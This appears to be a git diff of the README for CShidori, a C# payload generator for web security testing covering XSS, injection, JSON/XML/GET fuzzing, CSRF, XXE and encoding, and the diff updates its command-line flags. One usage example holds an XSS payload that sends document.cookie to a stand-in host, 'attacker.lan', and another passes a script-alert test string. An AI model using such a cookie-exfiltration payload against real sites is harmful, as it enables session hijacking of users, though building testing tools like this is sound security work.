@@ -4,8 +4,7 @@ A C# "Thousand Birds" Payloads Generator
 
 ## Dev Roadmap
 
-- use "badchars" list instead of -i parameter
-- store badchars with Entity Framework
+- store badstrings with Entity Framework
 
 ## Disclaimer
 
@@ -26,37 +25,38 @@ Taisen: [Website](https://taisen.fr)
 - CSRF
 - XXE
 - Encoding
+- List Dump
 
 ## Usage
 
 ### Mutation
 
 ```powershell
-.\CShidori.exe -m mut -p 5 -i test
+.\CShidori.exe -m mut -o 5 -p test
 ```
 
 ### XSS / Injections
 
 ```powershell
-.\CShidori.exe -m xss -i 'document.location=\"https://attacker.lan?c=\"+document.cookie'
+.\CShidori.exe -m xss -p 'document.location=\"https://attacker.lan?c=\"+document.cookie'
 ```
 
 ### JSON
 
 ```powershell
-.\CShidori.exe -m json -p ..\testing\test.json -i "'"
+.\CShidori.exe -m json -p ..\testing\test.json
 ```
 
 ### XML
 
 ```powershell
-.\CShidori.exe -m xml -p ..\testing\exemple.xml -i "'"
+.\CShidori.exe -m xml -p ..\testing\exemple.xml
 ```
 
 ### GET
 
 ```powershell
-.\CShidori.exe -m get -p "?bar=foo&foo=bar" -i "'"
+.\CShidori.exe -m get -p "?bar=foo&foo=bar"
 ```
 
 ### CSRF
@@ -77,6 +77,12 @@ Taisen: [Website](https://taisen.fr)
 
 ```powershell
 .\CShidori.exe -m enc -p "<script>alert(1)</script>"
+```
+
+### Dump
+
+```powershell
+.\CShidori.exe -m bs
 ```
 
 ## Miscellaneous
